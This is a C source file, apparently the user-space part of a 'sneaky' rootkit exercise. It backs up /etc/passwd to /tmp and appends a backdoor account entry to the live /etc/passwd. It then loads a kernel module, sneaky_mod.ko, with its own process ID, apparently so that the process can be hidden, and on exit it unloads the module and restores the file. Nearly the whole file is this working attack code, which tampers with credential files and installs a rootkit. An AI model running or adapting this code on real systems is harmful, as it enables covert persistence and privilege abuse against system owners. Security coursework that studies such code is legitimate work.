#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void copy_file(char * srcName, char * dstName) {
  size_t sz = 0;
  ssize_t len = 0;
  char * line = NULL;
  FILE * srcFile = fopen(srcName, "r");
  if (srcFile == NULL) {
    printf("Cannot open file %s \n", srcName);
    EXIT_FAILURE;
  }
  FILE * dstFile = fopen(dstName, "w");
  if (dstFile == NULL) {
    printf("Cannot open file %s \n", dstName);
    EXIT_FAILURE;
  }

  while((len = getline(&line, &sz, srcFile)) >= 0){
    fputs(line, dstFile);
  }
  fclose(srcFile);
  fclose(dstFile);
}

void add_passwd(char * fileName, char * passwd) {
  FILE * file = fopen(fileName, "a+");
  if (file == NULL) {
    printf("Cannot open file %s \n", fileName);
    EXIT_FAILURE;
  }
  fprintf(file, "%s", passwd);
  fclose(file);
}

void start_sneaky(){
  char arg[50];
  sprintf(arg, "insmod sneaky_mod.ko sneaky_pid=%d", getpid());
  printf("\n");
  system(arg);
}

void end_sneaky(){
  system("rmmod sneaky_mod.ko");
  copy_file("/tmp/passwd", "/etc/passwd");
  system("rm /tmp/passwd"); 
}

int main() {
  printf("sneaky_process pid = %d\n", getpid());
  // Copy the content of the original password file to the new password file
  copy_file("/etc/passwd", "/tmp/passwd");

  // Add new line of password to the original password file
  add_passwd("/etc/passwd", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
  
  // Start sneaky process right now
  start_sneaky();
  
  // Waiting for the terminated command
  char c = 's';
  while (c != 'q') {
    c = getchar();
  }

  // End sneaky process right now 
  end_sneaky();
  
  return EXIT_SUCCESS;
}